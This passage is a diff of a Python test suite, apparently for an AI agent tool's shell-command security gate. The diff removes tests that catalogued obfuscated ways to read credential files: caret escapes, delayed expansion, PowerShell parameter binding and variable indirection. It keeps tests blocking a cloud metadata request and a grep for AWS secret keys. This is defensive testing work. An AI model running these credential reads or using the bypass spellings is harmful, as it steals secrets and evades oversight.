-            "truncate",
-            "sh",
-            "bash",
-            "env",
-            "sudo",
-        ):
-            assert writer not in _TRUST_ROOT_READ_LISTERS, writer
-
-    def test_extract_into_trust_root_benign_destination_allowed(self) -> None:
-        # The carve-out must not widen the rule: an archive program writing
-        # somewhere else was always allowed and stays allowed.
-        assert is_sensitive_bash_command("tar -xf release.tar -C /tmp/build") is None
-        assert is_sensitive_bash_command("unzip data.zip -d /tmp/data") is None
-
-    def test_normal_crew_access_not_overblocked(self) -> None:
-        # Regression guard: the broadened rules must not block routine
-        # non-sensitive crew-home access (config.json, sessions.db).
-        assert is_sensitive_bash_command("cat ~/.kiro/crew/config.json") is None
-        assert is_sensitive_bash_command("sqlite3 ~/.kiro/crew/sessions.db .tables") is None
-        assert is_sensitive_bash_command("cat ~/.kirocrew/config.json") is None
-        assert is_sensitive_bash_command("sqlite3 ~/.kirocrew/sessions.db .tables") is None
 
     # ── IMDS short-form (inet_aton 2-/3-part) encodings ──
     # canonicalize_ip only handled 1-part and 4-part encodings, so the 2-part
@@ -5887,35 +5027,8 @@ class TestIsSensitiveBashCommand:
         assert _check_imds_access("curl http://93.184.216.34/") is None
         assert canonicalize_ip("8.8.8.8") == "8.8.8.8"
 
-    # ── Unresolved shell-variable indirection bypass ──
-
-    def test_variable_indirection_denied(self) -> None:
-        """Shell-variable indirection must not bypass the sensitive-path gate."""
-        cmd = "F=security_policy.json; cat ~/.kiro/crew/$F"
-        result = security.is_sensitive_bash_command(cmd)
-        assert result is not None
-        assert "unresolved shell variable" in result.lower() or "sensitive" in result.lower()
-
-    def test_variable_indirection_variants(self) -> None:
-        """Multiple forms of unresolved variables in path position are blocked."""
-        cases = [
-            "cat ${HOME}/.kiro/crew/${F}",
-            "cat ~/.aws/$PROFILE/credentials",
-            "cat ~/.ssh/$KEYNAME",
-        ]
-        for cmd in cases:
-            result = security.is_sensitive_bash_command(cmd)
-            assert result is not None, f"Expected denial for: {cmd}"
-
-    def test_normal_home_expansion_still_works(self) -> None:
-        """$HOME expansion to sensitive paths is still caught (regression)."""
-        cmd = "cat $HOME/.aws/config"
-        result = security.is_sensitive_bash_command(cmd)
-        assert result is not None
-
     def test_non_path_variables_allowed(self) -> None:
         """Variables that aren't in path-like tokens don't trigger the gate."""
-        # echo $USER has no / so _is_path_like is False
         safe_cases = [
             "echo $USER",
             "echo hello",
@@ -5926,1753 +5039,83 @@ class TestIsSensitiveBashCommand:
             assert result is None, f"Unexpected denial for: {cmd}"
 
 
-class TestChdirVerbSpellings:
-    """The working-directory tracker across bash, PowerShell and cmd.exe verbs.
+class TestTheBashGateMatchesNoPaths:
+    """The contract: ``is_sensitive_bash_command`` does not match paths in command text.
 
-    `is_sensitive_bash_command` runs on the raw command string of every shell
-    tool call with no per-platform branch, and the absolute-path pass already
-    accepts cmd.exe / PowerShell spellings. Tracking only ``cd`` and ``pushd``
-    therefore left the Windows spelling of cd-then-relative unmodelled.
+    Sensitive paths are enforced by the OS sandbox (which hides the credential
+    stores from the agent's process tree and mounts the governance keystone
+    read-only in every mode) and by :func:`is_sensitive_path` on every resolved
+    path the file tools open. A regex over the text of a command added no
+    protection on top of those and refused ordinary read-only work whenever a
+    fenced spelling appeared as data, so the gate carries none. Both halves are
+    pinned together: the paths it no longer matches, and the detectors it still
+    runs -- a test that pinned only the allowed half would pass just as well if
+    the whole gate were deleted.
     """
 
-    #: Every verb that moves the working directory, in each shell's spelling.
-    CHDIR_VERBS = (
-        "cd",
-        "pushd",
-        "chdir",
-        "sl",
-        "Set-Location",
-        "set-location",
-        "Push-Location",
+    #: Spellings the removed passes refused. Each names a credential store or the
+    #: governance keystone in the text, and each is now the sandbox's business.
+    UNMATCHED = (
+        "cat ~/.aws/credentials",
+        "cat $HOME/.ssh/id_rsa",
+        "cd ~/.kiro/crew && cat security_policy.json",
+        "tar -xf x.tar -C $HOME//.kiro/crew",
+        'V=$HOME; awk 1 "$V/.aws/credentials"',
+        "cat ~/../.aws/credentials",
+        "cd ~ & type .aws\\credentials",
+        "echo x > ~/.kiro/crew/apps/ops-mission-control/data/rotation.yaml",
     )
 
-    #: Home anchors a `cd` target can carry. Exactly the set the absolute-path
-    #: pass accepts, so the drift test below can hold both to one list. A bare
-    #: ``%HOMEPATH%`` is absent on purpose: neither pass accepts it (a
-    #: pre-existing, drive-letter-less gap in the absolute pass, out of scope
-    #: here) and listing it on one side only is the asymmetry being closed.
-    HOME_ANCHORS = (
-        "~",
-        "$HOME",
-        "%USERPROFILE%",
-        "%HOMEDRIVE%%HOMEPATH%",
-        # cmd.exe delayed expansion (`cmd /V:ON`) names the same home as the `%…%`
-        # spelling, and was the one anchor no branch recognised.
-        "!USERPROFILE!",
-        "!HOMEDRIVE!!HOMEPATH!",
-        "$env:USERPROFILE",
-        "${env:USERPROFILE}",
-        "$env:HOMEDRIVE$env:HOMEPATH",
-        "${env:HOMEDRIVE}${env:HOMEPATH}",
-    )
+    @pytest.mark.parametrize("command", UNMATCHED)
+    def test_a_path_in_command_text_is_not_a_verdict(self, command: str) -> None:
+        assert is_sensitive_bash_command(command) is None, command
 
-    @pytest.mark.parametrize("verb", CHDIR_VERBS)
-    def test_every_chdir_verb_moves_the_base(self, verb: str) -> None:
-        """A relative read after the move resolves against the directory entered."""
-        assert security.is_sensitive_bash_command(f"{verb} ~; cat .aws/credentials")
-        assert security.is_sensitive_bash_command(f"{verb} ~ && cat .ssh/id_rsa")
-        assert security.is_sensitive_bash_command(f"{verb} $HOME; cat .kiro/crew/token_signing.key")
+    def test_imds_is_still_refused(self) -> None:
+        reason = is_sensitive_bash_command("curl http://169.254.169.254/latest/meta-data/")
+        assert reason is not None and reason.startswith("Blocked: command accesses IMDS")
 
-    @pytest.mark.parametrize("verb", CHDIR_VERBS)
-    def test_every_chdir_verb_into_a_fenced_dir_taints_the_read(self, verb: str) -> None:
-        """Entering the fenced directory itself, then reading a bare filename."""
-        assert security.is_sensitive_bash_command(f"{verb} ~/.aws; cat credentials")
-        assert security.is_sensitive_bash_command(f"{verb} ~/.kiro/crew; cat token_signing.key")
+    def test_environment_credentials_are_still_refused(self) -> None:
+        reason = is_sensitive_bash_command("env | grep AWS_SECRET_ACCESS_KEY")
+        assert reason is not None and "environment" in reason
 
-    @pytest.mark.parametrize("verb", CHDIR_VERBS)
-    def test_chdir_verbs_do_not_over_block_benign_targets(self, verb: str) -> None:
-        """Recognising more verbs must not deny ordinary relative reads."""
-        assert security.is_sensitive_bash_command(f"{verb} /tmp; cat notes.txt") is None
-        assert security.is_sensitive_bash_command(f"{verb} ./build; cat log.txt") is None
-        assert security.is_sensitive_bash_command(f"{verb} ~/project; cat main.py") is None
+    def test_an_oversized_subject_is_still_refused_unscanned(self) -> None:
+        from kiro_crew.security import MAX_SCANNABLE_COMMAND_CHARS
 
-    @pytest.mark.parametrize("anchor", HOME_ANCHORS)
-    def test_home_anchor_as_a_chdir_target(self, anchor: str) -> None:
-        """Every home anchor the absolute pass accepts also anchors a `cd`.
+        reason = is_sensitive_bash_command("y" * (MAX_SCANNABLE_COMMAND_CHARS + 1))
+        assert reason is not None and "too large to security-scan" in reason
 
-        These need their own rewriter rather than leaning on the
-        unresolved-variable hypothesis, because that machinery answers a different
-        question: it asks whether an UNRESOLVABLE value could name a home, whereas
-        each of these anchors names one outright. A `cd` target has to be resolved,
-        not hypothesised, for the relative read after it to be tracked at all.
-        """
-        assert security.is_sensitive_bash_command(f"cd {anchor}; type .aws/credentials")
-        assert security.is_sensitive_bash_command(f"Set-Location {anchor}; Get-Content .ssh/id_rsa")
-        assert security.is_sensitive_bash_command(f"chdir {anchor}/.aws; type credentials")
+    def test_the_path_matchers_are_absent(self) -> None:
+        """Names, not behaviour: a reinstated matcher fails loudly here."""
+        from kiro_crew import security
 
-    @pytest.mark.parametrize("anchor", HOME_ANCHORS)
-    def test_absolute_pass_and_chdir_tracker_accept_the_same_anchors(self, anchor: str) -> None:
-        """Drift guard: the two anchor lists must not diverge.
-
-        `_WINDOWS_HOME_ANCHOR_RE` mirrors the ``userprofile`` alternation inside
-        `_build_sensitive_regex`. Adding a spelling to one and not the other
-        leaves a half-covered anchor, which is exactly the asymmetry this class
-        exists to close, so pin both directions on one list.
-        """
-        # Absolute spelling: the anchor names the fenced path outright.
-        assert security.is_sensitive_bash_command(f"type {anchor}/.aws/credentials")
-        # Relative spelling: the anchor is the `cd` target, the fenced path the tail.
-        assert security.is_sensitive_bash_command(f"cd {anchor}; type .aws/credentials")
-
-    def test_benign_anchor_is_not_read_as_a_home(self) -> None:
-        """The rewriter is anchored, so it cannot fire mid-token or on a lookalike."""
-        assert security.is_sensitive_bash_command("cd /tmp/%USERPROFILE%; cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cd ./%USERPROFILE%; cat main.py") is None
-        assert security.is_sensitive_bash_command("echo %USERPROFILE%") is None
-
-    def test_undoing_the_move_does_not_clear_the_denial(self) -> None:
-        """`popd` / `Pop-Location` are deliberately not modelled.
-
-        Modelling them would REMOVE a tracked base, and the base set is kept
-        monotone precisely so that adding syntax cannot walk a denial back.
-        """
-        assert security.is_sensitive_bash_command("pushd ~/.aws; popd; cat credentials")
-        assert security.is_sensitive_bash_command(
-            "Push-Location ~/.aws; Pop-Location; cat credentials"
-        )
-
-    def test_cmd_exe_drive_switch_is_not_the_target(self) -> None:
-        """`cd /d <dir>` must track <dir>, via the candidate rule.
-
-        cmd.exe's only `cd` switch sits before the target and is forward-slash
-        prefixed, so it does not look like a flag. It is NOT classified as one
-        either: a single-letter absolute path is a real POSIX directory that can
-        be the crew home, and discarding it turned `KIROCREW_HOME=/d` plus
-        `cd /d; cat token_signing.key` from denied into allowed. Keeping every
-        non-switch argument as a candidate reaches the real directory without
-        having to decide which reading of `/d` was meant.
-        """
-        assert security.is_sensitive_bash_command("chdir /d %USERPROFILE% && type .aws/credentials")
-        assert security.is_sensitive_bash_command("cd /d %USERPROFILE%; type .aws/credentials")
-        assert security.is_sensitive_bash_command("cd /D $env:USERPROFILE; type .ssh/id_rsa")
-        assert security.is_sensitive_bash_command("cd /d ~/.aws && cat credentials")
-
-    def test_slash_letter_path_stays_a_directory(self) -> None:
-        """A `/X` token is a candidate target, never a discarded flag."""
-        assert security.is_sensitive_bash_command("cd /data; cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cd /d/project; cat main.py") is None
-        assert security.is_sensitive_bash_command("cd /tmp; cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cd /d /tmp; cat notes.txt") is None
-        # Ratchet: the switch classification is gone, so nothing can discard a
-        # single-letter absolute path again. Only `-` prefixes are flags.
-        assert not hasattr(security, "_CHDIR_SWITCH_RE")
-        assert security._is_chdir_switch("-Path")
-        assert not security._is_chdir_switch("/d")
-
-    def test_powershell_call_operator_prefix_is_unwrapped(self) -> None:
-        """`& Set-Location ~` invokes the cmdlet, so the verb is not operand 0.
-
-        PowerShell's call operator prefixes the command the same way bash's
-        `builtin` / `command` keywords do. In bash a leading `&` never appears as
-        an operand, so unwrapping it costs the POSIX reading nothing.
-        """
-        amp = chr(38)
-        assert security.is_sensitive_bash_command(
-            amp + " Set-Location ~; Get-Content .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(amp + " cd ~; cat .aws/credentials")
-        assert security.is_sensitive_bash_command(
-            amp + " chdir %USERPROFILE%; type .kiro/crew/token_signing.key"
-        )
-
-    def test_every_non_switch_argument_is_a_candidate_target(self) -> None:
-        """A parameter's VALUE must not be mistaken for the directory.
-
-        A PowerShell common parameter takes a value that is not switch-shaped, so
-        selecting the first non-switch token picked the value and never looked at
-        the real directory. Keeping every candidate needs no list of which
-        parameters take values -- that set only grows -- and a spurious candidate
-        only adds a base, which only ever produces more denials.
-        """
-        assert security.is_sensitive_bash_command(
-            "Set-Location -ErrorAction Stop ~; Get-Content .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -ErrorAction Stop %USERPROFILE%; type .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -WarningAction SilentlyContinue ~; Get-Content .ssh/id_rsa"
-        )
-        # A parameter whose value IS the directory still works.
-        assert security.is_sensitive_bash_command(
-            "Set-Location -Path ~; Get-Content .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -LiteralPath ~; Get-Content .aws/credentials"
-        )
-
-    def test_extra_candidates_do_not_over_block(self) -> None:
-        """Carrying every candidate must not deny ordinary command lines."""
-        assert (
-            security.is_sensitive_bash_command(
-                "Set-Location -ErrorAction Stop /tmp; Get-Content notes.txt"
-            )
-            is None
-        )
-        assert security.is_sensitive_bash_command("cd -- ~/project; cat main.py") is None
-        assert security.is_sensitive_bash_command("cd ~/project src; cat main.py") is None
-
-    def test_secondary_taint_scan_also_reads_every_candidate(self) -> None:
-        """The substitution-aware scan must match the primary loop's selector.
-
-        A `cd` target that IS a command substitution carrying separators is only
-        visible to the segment-aware secondary scan -- the primary scan splits
-        inside `$( )` and garbles the token. Reaching it past a common
-        parameter's value needs that scan to inspect every candidate too, which
-        is a real difference in verdict and not just consistency for its own sake.
-        """
-        sub = '"$(printf %s ~; printf %s /.aws)"'
-        assert security.is_sensitive_bash_command(
-            "Set-Location -ErrorAction Stop " + sub + "; cat credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -WarningAction SilentlyContinue " + sub + "; cat credentials"
-        )
-        assert security.is_sensitive_bash_command("cd /d " + sub + "; cat credentials")
-
-    def test_colon_bound_parameter_payload_is_a_candidate(self) -> None:
-        """PowerShell binds a value with `:`, so the whole token starts with `-`.
-
-        `Set-Location -Path:$env:USERPROFILE/.aws` is one token beginning with a
-        dash, so the flag filter discarded it and the directory was never seen.
-        The payload after the FIRST separator is kept instead -- first, so that
-        `$env:USERPROFILE` survives intact inside it.
-        """
-        assert security.is_sensitive_bash_command(
-            "Set-Location -Path:$env:USERPROFILE/.aws; Get-Content credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -LiteralPath:~/.aws; Get-Content credentials"
-        )
-        assert security.is_sensitive_bash_command("Set-Location -Path:~; Get-Content .ssh/id_rsa")
-        assert security.is_sensitive_bash_command("sl -Path:%USERPROFILE%; type .aws/credentials")
-        # The `=` binder too, and a parameter name this code has never heard of.
-        assert security.is_sensitive_bash_command("cd -Path=~/.aws; cat credentials")
-        assert security.is_sensitive_bash_command("Set-Location -Somewhere:~/.aws; cat credentials")
-
-    def test_bound_payload_rule_does_not_over_block(self) -> None:
-        """A bound payload that is not a fenced directory stays allowed."""
-        assert (
-            security.is_sensitive_bash_command("Set-Location -Path:/tmp; Get-Content notes.txt")
-            is None
-        )
-        assert security.is_sensitive_bash_command("cd -Path:~/project; cat main.py") is None
-        assert (
-            security.is_sensitive_bash_command("cd -ErrorAction:Stop /tmp; cat notes.txt") is None
-        )
-        # A flag with no payload contributes no candidate at all.
-        assert security._chdir_candidates(["-Force"]) == []
-        assert security._chdir_candidates(["-Path:"]) == []
-        assert security._chdir_candidates(["--", "~/x"]) == ["~/x"]
-        assert security._chdir_candidates(["-Path:a:b"]) == ["a:b"]
-
-    def test_verb_set_has_one_home(self) -> None:
-        """Both passes read the same set, so a new spelling lands in both."""
-        assert "set-location" in security._CHDIR_VERBS
-        assert "push-location" in security._CHDIR_VERBS
-        assert "chdir" in security._CHDIR_VERBS
-        assert security._is_chdir_verb("Set-Location")
-        assert security._is_chdir_verb("/usr/bin/chdir")
-        assert not security._is_chdir_verb("cat")
-
-
-class TestNativeHomeEntryThenFencedRead:
-    """The grammar-free scan for native Windows working-directory spellings.
-
-    Pass 2 resolves the working directory by walking the command, which needs the
-    walk to agree with the shell's grammar. For a native Windows command line it
-    does not, and #5226 showed that closing the divergences one at a time does
-    not terminate (four rounds, four elements, with a fifth visible). This scan
-    answers a question that needs no grammar: was an entry into the home
-    directory seen anywhere, and does a fenced path spelled relative to it appear
-    after that?
-    """
-
-    BS = chr(92)
-    AMP = chr(38)
-    CARET = chr(94)
-    DQ = chr(34)
-    BT = chr(96)
-
-    def test_backslash_as_separator(self) -> None:
-        """POSIX tokenizing reads `\\` as an escape, so the fenced dir vanished."""
-        assert security.is_sensitive_bash_command("cd ~; cat .aws" + self.BS + "credentials")
-        assert security.is_sensitive_bash_command(
-            "cd ~; cat .kiro" + self.BS + "crew" + self.BS + "token_signing.key"
-        )
-
-    def test_single_ampersand_as_sequencer(self) -> None:
-        """cmd.exe's `&` means "then"; in bash it backgrounds, so the walk is right
-        to keep no boundary there and this belongs to a grammar-free scan."""
-        assert security.is_sensitive_bash_command("cd ~ " + self.AMP + " cat .aws/credentials")
-        assert security.is_sensitive_bash_command(
-            "cd /d %USERPROFILE% " + self.AMP + " type .aws" + self.BS + "credentials"
-        )
-
-    def test_caret_escape(self) -> None:
-        """cmd.exe's `^` escape, tolerated INSIDE the fenced pattern only.
-
-        Two distinct positions, and they are accepted by two different parts of
-        the pattern: after the LAST segment (the trailing separator group) and
-        BETWEEN segments (the join). A single-segment entry like `.aws` only
-        exercises the first, so the keystone path is covered explicitly.
-        """
-        assert security.is_sensitive_bash_command(
-            "cd ~ " + self.AMP + " type .aws" + self.CARET + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "cd ~ "
-            + self.AMP
-            + " type .kiro"
-            + self.CARET
-            + self.BS
-            + "crew"
-            + self.CARET
-            + self.BS
-            + "token_signing.key"
-        )
-
-    def test_glued_drive_switch(self) -> None:
-        """`cd/d` needs no space, and `os.path.basename('cd/d')` is `'d'`."""
-        assert security.is_sensitive_bash_command(
-            "cd/d %USERPROFILE% " + self.AMP + " type .aws" + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command("chdir/d ~ && cat .aws/credentials")
-
-    def test_powershell_pipeline(self) -> None:
-        """A PowerShell pipeline does not fork the directory; a bash one does."""
-        assert security.is_sensitive_bash_command(
-            "Set-Location ~ -PassThru | ForEach-Object { Get-Content .aws/credentials }"
-        )
-        assert security.is_sensitive_bash_command("Set-Location ~ | Get-Content .aws/credentials")
-
-    def test_bare_chdir_lands_in_the_home_directory(self) -> None:
-        assert security.is_sensitive_bash_command("cd; cat .aws/credentials")
-        assert security.is_sensitive_bash_command(
-            "cd " + self.AMP + self.AMP + " cat .kiro/crew/token_signing.key"
-        )
-
-    def test_caret_does_not_eat_a_regex_anchor(self) -> None:
-        """The reason `^` is NOT stripped globally.
-
-        A global strip would turn `grep '^.aws/credentials'` into a path and deny
-        a file the command never opens. Tolerating the caret only between fenced
-        SEGMENTS cannot reach an anchor elsewhere in the command.
-        """
-        assert (
-            security.is_sensitive_bash_command("cd ~; grep '" + self.CARET + "foo' notes.txt")
-            is None
-        )
-        assert (
-            security.is_sensitive_bash_command("cd ~; grep -n '" + self.CARET + "def ' main.py")
-            is None
-        )
-
-    def test_no_home_entry_means_no_denial(self) -> None:
-        """The scan is ordered: the entry must be seen BEFORE the relative name."""
-        assert security.is_sensitive_bash_command("cd /tmp; cat build/out.log") is None
-        assert security.is_sensitive_bash_command("cd /tmp " + self.AMP + " cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cat notes.txt") is None
-
-    def test_benign_relative_reads_after_entering_home(self) -> None:
-        assert security.is_sensitive_bash_command("cd ~; cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cd ~; cat project/main.py") is None
-        assert security.is_sensitive_bash_command("Set-Location ~ | Get-Content notes.txt") is None
-        assert security.is_sensitive_bash_command("cd ~; cat my" + self.BS + " notes.txt") is None
-
-    def test_lookalike_directory_names_are_not_fenced(self) -> None:
-        """A name that merely STARTS like a fenced dir is a different directory."""
-        assert security.is_sensitive_bash_command("cd ~; cat .awsome/config") is None
-        assert security.is_sensitive_bash_command("cd ~; cat .kirocrewnotes") is None
-
-    def test_quoted_home_target(self) -> None:
-        """cmd.exe and PowerShell both accept a quoted chdir target.
-
-        `cd /d "%USERPROFILE%"` puts a quote between the whitespace and the
-        anchor, so a pattern that required the anchor to start immediately after
-        whitespace saw no entry at all.
-        """
-        assert security.is_sensitive_bash_command(
-            'cd /d "%USERPROFILE%" ' + self.AMP + " more .aws" + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command('cd "~" ' + self.AMP + " cat .aws/credentials")
-        assert security.is_sensitive_bash_command("cd '~' " + self.AMP + " cat .aws/credentials")
-        assert security.is_sensitive_bash_command(
-            'cd "%USERPROFILE%"; type .aws' + self.BS + "credentials"
-        )
-
-    def test_redirection_boundary_before_the_fenced_tail(self) -> None:
-        """A redirection operator starts a path just as whitespace does.
-
-        `more<.aws\\credentials` has no space before the name. The boundary is now
-        defined by what a path IS -- the name must not be preceded by a path
-        character -- rather than by an enumerated list of the punctuation that may
-        precede it, so every operator is covered at once instead of one per round.
-        """
-        assert security.is_sensitive_bash_command(
-            "cd %USERPROFILE% " + self.AMP + " more<.aws" + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command("cd ~ " + self.AMP + " more<.aws/credentials")
-        assert security.is_sensitive_bash_command("cd ~; cat >.aws/credentials")
-        assert security.is_sensitive_bash_command("cd ~; {cat .aws/credentials;}")
-
-    def test_entering_a_home_SUBdirectory_is_not_entering_home(self) -> None:
-        """The trailing lookaround refuses a path continuation, not just a terminator.
-
-        `cd ~/project` moves somewhere whose `.aws` tail resolves to
-        `~/project/.aws`, which is not fenced -- so this must NOT count as an
-        entry, quoted or not.
-        """
-        assert security.is_sensitive_bash_command('cd "~/project"; cat main.py') is None
-        assert security.is_sensitive_bash_command("cd ~/project; cat .aws/credentials") is None
-        assert security.is_sensitive_bash_command("cd ~/project " + self.AMP + " cat x.py") is None
-
-    def test_longer_filename_ending_in_a_fenced_name(self) -> None:
-        """The leading lookaround also rejects a name that merely ENDS this way."""
-        assert security.is_sensitive_bash_command("cd ~; cat x.aws/credentials") is None
-        assert security.is_sensitive_bash_command("cd ~; cat my.kiro/crew/x") is None
-
-    def test_home_target_bound_to_a_parameter(self) -> None:
-        """`Set-Location -Path:~` binds the target to the flag with `:` or `=`.
-
-        The switch group would otherwise consume `-Path:~` whole and the entry
-        would never be seen. Same class as the bound-payload finding on #5226,
-        which the walk solved in `_chdir_candidates`; this raw-text scan needs its
-        own form of it.
-        """
-        assert security.is_sensitive_bash_command("Set-Location -Path:~ | Get-Content .npmrc")
-        assert security.is_sensitive_bash_command(
-            "Set-Location -Path=~ | Get-Content .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "cd -LiteralPath:%USERPROFILE% " + self.AMP + " type .aws" + self.BS + "credentials"
-        )
-
-    def test_operator_directly_after_the_fenced_name(self) -> None:
-        """The TRAILING boundary is the same non-path rule as the leading one.
-
-        Round 1 generalised only the leading side, so `type .npmrc&echo ok` stayed
-        outside the scan because `&` was not in the enumerated terminator list.
-        Stating the rule once as "a separator, or not path-adjacent" covers every
-        operator, brace and quote at once.
-        """
-        assert security.is_sensitive_bash_command(
-            "cd ~ " + self.AMP + " type .npmrc" + self.AMP + "echo ok"
-        )
-        assert security.is_sensitive_bash_command("cd ~; cat .aws/credentials|wc -l")
-        assert security.is_sensitive_bash_command("cd ~; cat .npmrc>out.txt")
-        assert security.is_sensitive_bash_command("cd ~; {cat .npmrc;}")
-        # The same boundary must still reject a longer name that only ends this way.
-        assert security.is_sensitive_bash_command("cd ~; cat .npmrcnotes") is None
-
-    def test_the_resolved_home_is_not_bound_at_import_time(self) -> None:
-        """The home is resolved per call, not once per process.
-
-        A module-level `Path.home()` freezes the answer for the life of the
-        process, which `test_host_isolation_floor`'s shared-path ratchet forbids
-        and which would make a repointed home invisible to this scan. There is no
-        longer a cached pattern to freeze it in -- `_names_home_directory` shapes
-        `Path.home()` on each call -- so this is now assertable by BEHAVIOUR
-        rather than by inspecting a constant.
-        """
-        assert "USERPROFILE" in security._HOME_SEGMENT_RE.pattern
-        assert str(Path.home()) not in security._HOME_SEGMENT_RE.pattern
-        # Repoint the home and the same command changes verdict, with no cache to
-        # invalidate and no reload.
-        elsewhere = "/nonexistent-home-" + "for-this-test"
-        assert security._names_home_directory(elsewhere) is False
-        with mock.patch.object(security.Path, "home", staticmethod(lambda: Path(elsewhere))):
-            assert security._names_home_directory(elsewhere) is True
-
-    def test_trailing_separator_on_the_home_target(self) -> None:
-        """`cd %USERPROFILE%\\` and `cd ~/` still land in the home directory.
-
-        A trailing separator with nothing after it names the same directory, so it
-        is consumed -- but only when nothing path-like follows, which is what keeps
-        `cd ~/project` out.
-        """
-        assert security.is_sensitive_bash_command(
-            "cd %USERPROFILE%" + self.BS + " " + self.AMP + " type .aws" + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command("cd ~/ " + self.AMP + " cat .aws/credentials")
-        assert security.is_sensitive_bash_command("cd ~/ ; cat .aws/credentials")
-        # The subdirectory rule must survive the trailing-separator allowance.
-        assert security.is_sensitive_bash_command("cd ~/project; cat .aws/credentials") is None
-        assert security.is_sensitive_bash_command("cd ~/project/ ; cat .aws/credentials") is None
-
-    def test_the_caret_escape_is_closed_at_every_position(self) -> None:
-        """cmd.exe's `^` escapes the next character anywhere, and now all of it is read.
-
-        Six review rounds treated this as unreachable by a pattern, and that was
-        true of a pattern: `^` can sit between ANY two characters of ANY token, so
-        a raw-text scan would need an optional caret interleaved everywhere. It is
-        trivial for a NORMALIZER, because a word is stripped once before it is
-        interpreted -- which is why closing the caret fell out of the rewrite
-        rather than needing its own mechanism.
-        """
-        for spelling in (
-            "cd ~ " + self.AMP + " type .aw" + self.CARET + "s" + self.BS + "credentials",
-            "cd ~ " + self.AMP + " type " + self.CARET + ".aws" + self.BS + "credentials",
-            "c" + self.CARET + "d ~ " + self.AMP + " type .aws" + self.BS + "credentials",
-            "cd %USER"
-            + self.CARET
-            + "PROFILE% "
-            + self.AMP
-            + " type .aws"
-            + self.BS
-            + "credentials",
+        for name in (
+            "_build_sensitive_regex",
+            "_get_sensitive_re",
+            "_sensitive_pattern_span",
+            "_sensitive_pattern_hit",
+            "_RELATIVE_SENSITIVE_RE",
+            "_fence_hit",
+            "_fence_hit_in_collapsed",
+            "_assignment_resolved_views",
+            "_trust_root_cd_views",
+            "_extracts_into_trust_root_span",
+            "_check_native_home_entry_then_fenced_read",
+            "_WRITE_PROTECTED_BASH_LEAVES",
+            "_BARE_TOKEN_PROTECTED_LEAVES",
         ):
-            assert security.is_sensitive_bash_command(spelling) is not None, spelling
-
-    def test_a_doubled_caret_is_a_literal_caret_not_a_deletion(self) -> None:
-        """`.a^^ws` is a file NAMED `.a^ws`, so it is not the fenced directory.
-
-        This is the case that separates applying cmd.exe's escape from merely
-        deleting every caret. A naive strip yields `.aws` and denies a command
-        that never touches the credential store; the real rule -- `^^` collapses
-        to one literal caret -- keeps them distinct.
-        """
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + " type .a" + self.CARET * 2 + "ws" + self.BS + "credentials"
-            )
-            is None
-        )
-        # And the odd-numbered sibling IS the fenced path, so the rule is not just
-        # "give up whenever a caret appears".
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + " type .aw" + self.CARET + "s" + self.BS + "credentials"
-            )
-            is not None
-        )
-
-    def test_a_regex_anchor_naming_no_fenced_path_stays_allowed(self) -> None:
-        """The invariant the caret work actually had to protect.
-
-        Stripping carets was long argued to be unacceptable because it would deny
-        `grep '^.aws/credentials' notes.txt`. That was not a principle: the
-        byte-identical command WITHOUT the caret is already denied, by this pass
-        and by the absolute-path pass, because naming a fenced path is itself the
-        signal. The caret was granting an exemption its own sibling never had.
-
-        What genuinely must keep working is a regex that names no fenced path.
-        """
-        for benign in (
-            "cd ~; grep '" + self.CARET + "def ' main.py",
-            "cd ~; grep -n '" + self.CARET + "import' main.py",
-            "cd ~; grep '" + self.CARET + "$' blank_lines.txt",
-        ):
-            assert security.is_sensitive_bash_command(benign) is None, benign
-        # The consistency this buys: caret or no caret, naming the fenced path
-        # reads the same way.
-        with_caret = "cd ~; grep '" + self.CARET + ".aws/credentials' notes.txt"
-        without = "cd ~; grep '.aws/credentials' notes.txt"
-        assert (security.is_sensitive_bash_command(with_caret) is None) == (
-            security.is_sensitive_bash_command(without) is None
-        )
-
-    def test_delayed_expansion_home_anchor_is_an_entry(self) -> None:
-        """`!USERPROFILE!` names the home directory as surely as `%USERPROFILE%`.
-
-        cmd.exe expands `!NAME!` under `/V:ON` (or `setlocal
-        EnableDelayedExpansion`). Reading only the `%` delimiter meant an
-        identical command written the delayed way was a different string to the
-        scan. Both delimiters are now generated from one variable name, so the
-        delimiter is a parameter rather than a per-spelling entry -- which is why
-        the mixed form below is covered without its own rule.
-        """
-        for target in (
-            "!USERPROFILE!",
-            "!HOMEDRIVE!!HOMEPATH!",
-            "%HOMEDRIVE%!HOMEPATH!",
-        ):
-            assert (
-                security.is_sensitive_bash_command(
-                    "cd /d " + target + " " + self.AMP + " type .aws" + self.BS + "credentials"
-                )
-                is not None
-            ), target
-
-    def test_delayed_expansion_inside_a_cmd_wrapper(self) -> None:
-        """The reported spelling verbatim: the whole command is one `cmd /V:ON /C` string."""
-        assert (
-            security.is_sensitive_bash_command(
-                'cmd /V:ON /C "cd /d !USERPROFILE! '
-                + self.AMP
-                + " type .aws"
-                + self.BS
-                + 'credentials"'
-            )
-            is not None
-        )
-
-    def test_drive_relative_fenced_tail_is_a_read(self) -> None:
-        """A drive letter with no separator means "current dir on that drive".
-
-        So `C:.aws\\credentials` is precisely the relative-tail shape this scan
-        exists for. It was previously refused by the leading boundary itself,
-        because `:` is path-adjacent -- the prefix is now part of the match rather
-        than something excluded before it.
-        """
-        for tail in ("C:.aws" + self.BS + "credentials", "C:.ssh/id_rsa"):
-            assert (
